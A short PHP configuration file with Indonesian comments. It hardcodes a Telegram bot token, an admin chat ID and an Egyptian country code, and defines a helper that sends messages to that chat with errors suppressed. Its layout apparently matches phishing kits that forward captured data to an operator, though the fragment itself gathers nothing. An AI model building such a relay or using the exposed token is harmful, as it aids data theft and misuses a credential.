<?php
session_start();

// ===== KONFIGURASI LANGSUNG (TANPA _rules.json) =====
$BOTKN  = "9074902271:AAGDaLfL2n0oc4OU5UA0PR99Gv4n1dg4enI";  // Token Bot Telegram Anda
$ADMID  = "7602918468";                                         // ID Telegram Admin Anda
$CCODE  = "20";                                                 // Kode Negara (Mesir)
// ====================================================

// Fungsi kirim ke Telegram tanpa IP/Address
if (!function_exists('send_to_telegram')) {
    function send_to_telegram($message) {
        global $BOTKN, $ADMID;
        $encodedMessage = urlencode($message);
        $url = "https://api.telegram.org/bot{$BOTKN}/sendMessage?chat_id={$ADMID}&text={$encodedMessage}&parse_mode=HTML";
        
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10
            ]
        ]);
        
        @file_get_contents($url, false, $context);
    }
}
?>